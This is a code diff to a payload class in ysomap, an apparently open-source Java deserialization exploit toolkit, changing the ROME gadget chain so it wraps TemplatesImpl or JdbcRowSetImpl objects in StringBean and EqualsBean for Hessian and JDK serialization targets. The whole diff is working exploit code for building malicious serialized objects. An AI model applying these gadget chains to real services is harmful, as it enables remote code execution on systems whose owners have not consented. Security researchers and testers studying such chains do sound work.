@@ -6,18 +6,18 @@ import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 
-import java.util.Vector;
+import javax.xml.transform.Templates;
 
 /**
  * @author wh1t3p1g
  * @since 2021/8/5
  */
 @Payloads
-@Authors({ Authors.MBECHLER })
-@Targets({Targets.HESSIAN})
-@Require(bullets = {"JdbcRowSetImplBullet"},param = false)
+@Authors({ Authors.MBECHLER, Authors.whocansee})
+@Targets({Targets.HESSIAN, Targets.JDK})
+@Require(bullets = {"JdbcRowSetImplBullet", "TemplatesImplBullet"},param = false)
 @Dependencies({"com.rometools:rome:1.11.1"})
-public class Rome extends HessianPayload{
+public class Rome1 extends HessianPayload{
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
@@ -26,17 +26,14 @@ public class Rome extends HessianPayload{
 
     @Override
     public Object pack(Object obj) throws Exception {
-        Vector v = new Vector<String>();
-        v.add("");
-        ReflectionHelper.setFieldValue(obj, "fetchDir", 1);
-        ReflectionHelper.setFieldValue(obj, "concurrency", 1);
-        ReflectionHelper.setFieldValue(obj, "rowSetType", 1);
-        ReflectionHelper.setFieldValue(obj, "iMatchColumns", null);
-        ReflectionHelper.setFieldValue(obj, "strMatchColumns", v);
-        ReflectionHelper.setFieldValue(obj, "resBundle", null);
+        Object stringBean = null;
+        if(obj instanceof Templates){
+            stringBean = makeStringBean(Templates.class, obj);
+        }else{
+            Class<?> type = obj.getClass();
+            stringBean = makeStringBean(type, obj);
+        }
 
-        Class<?> type = obj.getClass();
-        Object stringBean = makeStringBean(type, obj);
         Object equalsBean = makeEqualsBean(makeStringBeanClass(), stringBean);
 
 //        ObjectBean delegate = new ObjectBean(type, obj);
@@ -46,7 +43,7 @@ public class Rome extends HessianPayload{
 
         return PayloadHelper.makeMap(equalsBean, "");
 //        return PayloadHelper.makeMap(root, root);
-        // using XString triger to ToStringBean also work
+        // using XString trigger to ToStringBean also work
     }
 
     public Class<?> makeStringBeanClass() throws ClassNotFoundException {
